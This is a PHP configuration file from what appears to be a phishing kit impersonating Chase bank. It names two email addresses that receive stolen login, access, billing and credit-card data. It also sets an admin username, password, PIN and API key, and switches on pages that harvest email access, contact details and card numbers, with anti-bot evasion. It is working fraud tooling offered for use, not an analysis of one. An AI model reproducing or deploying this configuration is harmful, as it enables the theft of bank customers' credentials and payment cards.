<?php


// SPAM INFO

$yourname = "MRAZERT";
$your_email = "resultbox941@yandex.com,markwoody123450@gmail.com"; // logs+access
$your_email2 = "resultbox941@yandex.com,markwoody123450@gmail.com"; // Bills+cc


//ADMIN LOGIN INFO

$username = "anamedo1034";
$password = "Ahmed@@11";
$pin = "645345343256451"; 
// Redirect

$redirect = "chase";


// ON / OFF 
$spam_hotmail = "no";
$double_login = "no";
$double_access = "no";
$spox_protection = "no";
$redirection = "no";
$double_cc = "no";
$show_start_page = "yes"; 
$show_email_access = "yes"; 
$show_contact_information = "yes";
$show_credit_card = "yes";
$show_success_page = "yes";
$anti_bot = "yes";



// KEY PROTECTION
$api = "3c23ec5db070f21c3f5ed5cd77324914";





?>